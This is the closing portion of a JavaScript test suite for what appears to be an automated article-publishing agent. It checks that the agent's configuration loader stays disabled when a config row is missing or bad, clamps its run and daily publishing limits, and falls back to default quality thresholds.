  try { parseJson('not json at all'); return false; } catch (_) { return true; }
})());

// ═══════════════════════════════════════════════════════════════════════════
// config.load is async, so the rest runs inside a function. Deliberately NOT
// top-level await: Node then reclassifies this .js file as an ES module and
// every require() above it fails.
// ═══════════════════════════════════════════════════════════════════════════

/** A stub shaped like the one PostgREST call config.load makes. */
function stubDb(result) {
  return { from: () => ({ select: () => ({ eq: () => ({ limit: async () => result }) }) }) };
}
const settingsRow = (obj) => stubDb({ data: [{ value: JSON.stringify(obj) }] });

async function configChecks() {
  section('config normalisation');

  ok('enabled defaults to FALSE so installing the code publishes nothing', config.DEFAULTS.enabled === false);
  ok('there is a daily cap', config.DEFAULTS.maxPerDay >= 1 && config.DEFAULTS.maxPerDay <= 20);

  // A bad config row must not take the agent down, and must not turn it on.
  // This is the opposite direction from src/audience.js, and the comment in
  // config.js says why: failing open here publishes to a live site unattended.
  const bad = {
    'unreadable table': stubDb({ error: { message: 'boom' } }),
    'malformed JSON': stubDb({ data: [{ value: '{not json' }] }),
    'empty row': stubDb({ data: [] }),
    'null value': stubDb({ data: [{ value: null }] }),
  };
  for (const [name, db] of Object.entries(bad)) {
    const c = await config.load(db, { log: () => {} });
    ok(`${name}: agent stays DISABLED (fails closed)`, c.enabled === false);
    ok(`${name}: limits are still usable`, !!c.limits && c.limits.minWordsEn > 0);
  }

  const clamped = await config.load(settingsRow({
    enabled: true, articlesPerRun: 999, maxPerDay: -5, limits: { minWordsEn: 1234 },
  }), { log: () => {} });
  eq('articlesPerRun is clamped to the ceiling', clamped.articlesPerRun, 10);
  eq('maxPerDay is clamped up to the floor', clamped.maxPerDay, 1);
  eq('a named limit override is honoured', clamped.limits.minWordsEn, 1234);
  ok('unnamed limits keep their defaults', clamped.limits.minH2 === quality.DEFAULT_LIMITS.minH2);
  ok('enabled:true in the row is honoured (positive control)', clamped.enabled === true);

  const strBool = await config.load(settingsRow({ enabled: 'true', publish: 'false' }), { log: () => {} });
  ok('a string "true" is accepted for enabled', strBool.enabled === true);
  ok('a string "false" is accepted for publish', strBool.publish === false);

  const garbageLimits = await config.load(settingsRow({ enabled: true, limits: 'nonsense' }), { log: () => {} });
  ok('a non-object limits value falls back to the defaults',
    garbageLimits.limits.minWordsEn === quality.DEFAULT_LIMITS.minWordsEn);
}

configChecks().then(() => {
  console.log(`\n${'═'.repeat(60)}`);
  console.log(`${pass} passed, ${fail} failed`);
  if (fail) {
    console.log('\nfailing:');
    for (const f of failures) console.log(`  - ${f}`);
  }
  process.exit(fail ? 1 : 0);
}).catch((err) => {
  console.error('\nSUITE CRASHED:', err.stack || err.message);
  process.exit(2);
});
